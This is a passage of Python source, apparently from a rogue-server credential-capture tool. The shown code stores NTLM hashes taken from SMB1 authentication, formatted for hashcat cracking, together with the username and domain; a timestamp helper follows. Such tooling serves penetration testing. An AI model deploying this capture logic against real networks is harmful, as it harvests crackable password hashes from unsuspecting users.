        # workstation name (unlike NTLMSSP AUTHENTICATE).
        host_parts: list[str] = []
        if extras.get("os"):
            host_parts.append(extras.pop("os"))
        if domain:
            host_parts.append(f"(domain: {domain})")
        extras[_HOST_INFO] = " ".join(host_parts) if host_parts else "SMB1 raw"
        for version_label, hashcat_line in all_hashes:
            session.db.add_auth(
                client=client,
                credtype=version_label,
                username=user,
                domain=domain,
                password=hashcat_line,
                logger=logger,
                extras=extras,
            )

    except ValueError:
        log.exception("Invalid data in SMB1 basic-security auth; skipping capture")
    except Exception:
        log.exception("Failed to extract hashes from SMB1 basic-security auth")


# --- Utilities ---------------------------------------------------------------


def NTLM_timestamp() -> int:
    """Return the current UTC time as a Windows FILETIME (100ns ticks since 1601-01-01).

    :return: Current UTC time in 100-nanosecond intervals since Windows epoch (1601-01-01)
    :rtype: int
    """
    # calendar.timegm() → UTC seconds since 1970; scaled to 100ns ticks since 1601.
    return (
        NTLM_FILETIME_EPOCH_OFFSET
        + calendar.timegm(time.gmtime()) * NTLM_FILETIME_TICKS_PER_SECOND
    )
